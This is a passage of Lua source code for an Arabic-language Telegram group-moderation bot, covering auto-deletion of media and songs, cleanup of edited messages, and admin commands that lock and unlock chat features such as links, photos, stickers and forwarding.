Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙قم بتحديد عدد اكبر من 10 واصغر من 1000 للحذف التلقائي', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم وضع » *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
DevHmD:set(DevTwix..'HmD:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevHmD:get(DevTwix..'HmD:Lock:CleanNum'..msg.chat_id_) then
if DevHmD:get(DevTwix..'HmD:CleanNum'..msg.chat_id_) then CleanNum = DevHmD:get(DevTwix..'HmD:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevHmD:scard(DevTwix.."HmD:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevHmD:smembers(DevTwix.."HmD:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
SendText(msg.chat_id_,"⋄︙تم مسح "..Del.." من الميديا تلقائيا",0,'md') 
DevHmD:del(DevTwix.."HmD:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevHmD:get(DevTwix..'HmD:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevHmD:scard(DevTwix.."HmD:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙عدد الميديا » "..M.."\n⋄︙الحذف التلقائي » "..(DevHmD:get(DevTwix..'HmD:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتوجد ميديا هنا", 1, 'md') 
end end
end
end
---------------------------------------------------------------------------------------
if text == "تفعيل امسح" and Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل امر امسح بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل امر امسح بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevHmD:get(DevTwix..'HmD:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevHmD:scard(DevTwix.."HmD:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙عدد الميديا » "..M, 1, 'md') 
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتوجد ميديا هنا", 1, 'md') 
end end
if text == "امسح" and ChCheck(msg) or text == "احذف" and ChCheck(msg) or text == "تنظيف ميديا" and ChCheck(msg) or text == "تنظيف الميديا" and ChCheck(msg) then
local List = DevHmD:smembers(DevTwix.."HmD:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف "..Del.." من الميديا", 1, 'md') 
DevHmD:del(DevTwix.."HmD:cleaner"..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
end
---------------------------------------------------------------------------------------
if text == "تفعيل مسح الاغاني" and Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل مسح الاغاني بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل مسح الاغاني بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevHmD:get(DevTwix..'HmD:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevHmD:scard(DevTwix.."HmD:cleanermusic"..msg.chat_id_)
if M ~= 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙عدد الاغاني » "..M, 1, 'md') 
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتوجد اغاني هنا", 1, 'md') 
end end
if text == "مسح الاغاني" or text == "تنظيف الاغاني" or text == "حذف الاغاني" then
local List = DevHmD:smembers(DevTwix.."HmD:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم مسح "..Del.." من الاغاني", 1, 'md') 
DevHmD:del(DevTwix.."HmD:cleanermusic"..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
---------------------------------------------------------------------------------------
if Admin(msg) then
if text == "تنظيف تعديل" and ChCheck(msg) or text == "تنظيف التعديل" and ChCheck(msg) then   
HmD_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
HmD_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = HmD_Del},function(arg,data)
new = 0
HmD_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
HmD_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,HmD_Del2)
end,nil)  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
---------------------------------------------------------------------------------------
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "التعديل" then
if DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح التعديل")  
DevHmD:del(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if HmDConstructor(msg) then
if UnLockText[2] == "التعديل الميديا" or UnLockText[2] == "تعديل الميديا" then
if DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح تعديل الميديا")  
DevHmD:del(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
if UnLockText[2] == "الفارسيه" then
if DevHmD:get(DevTwix..'HmD:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الفارسيه")  
DevHmD:del(DevTwix..'HmD:Lock:Farsi'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفشار" then
if not DevHmD:get(DevTwix..'HmD:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الفشار")  
DevHmD:set(DevTwix..'HmD:Lock:Fshar'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الطائفيه" then
if not DevHmD:get(DevTwix..'HmD:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الطائفيه")  
DevHmD:set(DevTwix..'HmD:Lock:Taf'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكفر" then
if not DevHmD:get(DevTwix..'HmD:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الكفر")  
DevHmD:set(DevTwix..'HmD:Lock:Kfr'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه بالطرد" then
if DevHmD:get(DevTwix..'HmD:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الفارسيه بالطرد")  
DevHmD:del(DevTwix..'HmD:Lock:FarsiBan'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if HmDConstructor(msg) then
if UnLockText[2] == "البوتات" or UnLockText[2] == "البوتات بالطرد" or UnLockText[2] == "البوتات بالتقييد" or UnLockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح البوتات")  
DevHmD:del(DevTwix.."HmD:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevHmD:hdel(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح التكرار")  
end
if HMDicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevHmD:get(DevTwix..'HmD:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح التثبيت")  
DevHmD:del(DevTwix..'HmD:Lock:Pin'..msg.chat_id_)
DevHmD:srem(DevTwix.."HmD:Lock:Pinpin",msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
---------------------------------------------------------------------------------------
if Admin(msg) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "الدردشه" then
if not DevHmD:get(DevTwix..'HmD:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الدردشه")  
DevHmD:set(DevTwix..'HmD:Lock:Text'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not DevHmD:get(DevTwix..'HmD:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الاونلاين")  
DevHmD:set(DevTwix..'HmD:Lock:Inline'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not DevHmD:get(DevTwix..'HmD:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الصور")  
DevHmD:set(DevTwix..'HmD:Lock:Photo'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not DevHmD:get(DevTwix..'HmD:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الكلايش")  
DevHmD:set(DevTwix..'HmD:Lock:Spam'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not DevHmD:get(DevTwix..'HmD:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الدخول")  
DevHmD:set(DevTwix..'HmD:Lock:Join'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not DevHmD:get(DevTwix..'HmD:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الفيديو")  
DevHmD:set(DevTwix..'HmD:Lock:Videos'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not DevHmD:get(DevTwix..'HmD:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل المتحركه")  
DevHmD:set(DevTwix..'HmD:Lock:Gifs'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not DevHmD:get(DevTwix..'HmD:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الاغاني")  
DevHmD:set(DevTwix..'HmD:Lock:Music'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not DevHmD:get(DevTwix..'HmD:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الصوت")  
DevHmD:set(DevTwix..'HmD:Lock:Voice'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الروابط")  
DevHmD:set(DevTwix..'HmD:Lock:Links'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not DevHmD:get(DevTwix..'HmD:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل المواقع")  
DevHmD:set(DevTwix..'HmD:Lock:Location'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل المعرفات")  
DevHmD:set(DevTwix..'HmD:Lock:Tags'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not DevHmD:get(DevTwix..'HmD:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الملفات")  
DevHmD:set(DevTwix..'HmD:Lock:Document'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الهاشتاك")  
DevHmD:set(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not DevHmD:get(DevTwix..'HmD:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الجهات")  
DevHmD:set(DevTwix..'HmD:Lock:Contact'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '️⋄︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الشبكات")  
DevHmD:set(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل العربيه")  
DevHmD:set(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الانكليزيه")  
DevHmD:set(DevTwix..'HmD:Lock:English'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not DevHmD:get(DevTwix..'HmD:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الملصقات")  
DevHmD:set(DevTwix..'HmD:Lock:Stickers'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not DevHmD:get(DevTwix..'HmD:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الماركداون")  
DevHmD:set(DevTwix..'HmD:Lock:Markdown'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not DevHmD:get(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الاشعارات")  
DevHmD:set(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل التوجيه")  
DevHmD:set(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
---------------------------------------------------------------------------------------
if Admin(msg) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "الدردشه" then
if DevHmD:get(DevTwix..'HmD:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الدردشه")  
DevHmD:del(DevTwix..'HmD:Lock:Text'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if DevHmD:get(DevTwix..'HmD:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الصور")  
DevHmD:del(DevTwix..'HmD:Lock:Photo'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevHmD:get(DevTwix..'HmD:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الكلايش")  
DevHmD:del(DevTwix..'HmD:Lock:Spam'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if DevHmD:get(DevTwix..'HmD:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الدخول")  
DevHmD:del(DevTwix..'HmD:Lock:Join'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if DevHmD:get(DevTwix..'HmD:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الفيديو")  
DevHmD:del(DevTwix..'HmD:Lock:Videos'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if DevHmD:get(DevTwix..'HmD:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الملفات")  
DevHmD:del(DevTwix..'HmD:Lock:Document'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if DevHmD:get(DevTwix..'HmD:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الاونلاين")  
DevHmD:del(DevTwix..'HmD:Lock:Inline'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if DevHmD:get(DevTwix..'HmD:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الماركداون")  
DevHmD:del(DevTwix..'HmD:Lock:Markdown'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if DevHmD:get(DevTwix..'HmD:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح المتحركه")  
DevHmD:del(DevTwix..'HmD:Lock:Gifs'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if DevHmD:get(DevTwix..'HmD:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الاغاني")  
DevHmD:del(DevTwix..'HmD:Lock:Music'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if DevHmD:get(DevTwix..'HmD:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الصوت")  
DevHmD:del(DevTwix..'HmD:Lock:Voice'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الروابط")  
DevHmD:del(DevTwix..'HmD:Lock:Links'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if DevHmD:get(DevTwix..'HmD:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح المواقع")  
DevHmD:del(DevTwix..'HmD:Lock:Location'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح المعرفات")  
DevHmD:del(DevTwix..'HmD:Lock:Tags'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الهاشتاك")  
DevHmD:del(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if DevHmD:get(DevTwix..'HmD:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الجهات")  
DevHmD:del(DevTwix..'HmD:Lock:Contact'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الشبكات")  
DevHmD:del(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح العربيه")  
DevHmD:del(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الانكليزيه")  
DevHmD:del(DevTwix..'HmD:Lock:English'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if DevHmD:get(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الاشعارات")  
DevHmD:del(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if DevHmD:get(DevTwix..'HmD:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح الملصقات")  
DevHmD:del(DevTwix..'HmD:Lock:Stickers'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح التوجيه")  
DevHmD:del(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
---------------------------------------------------------------------------------------
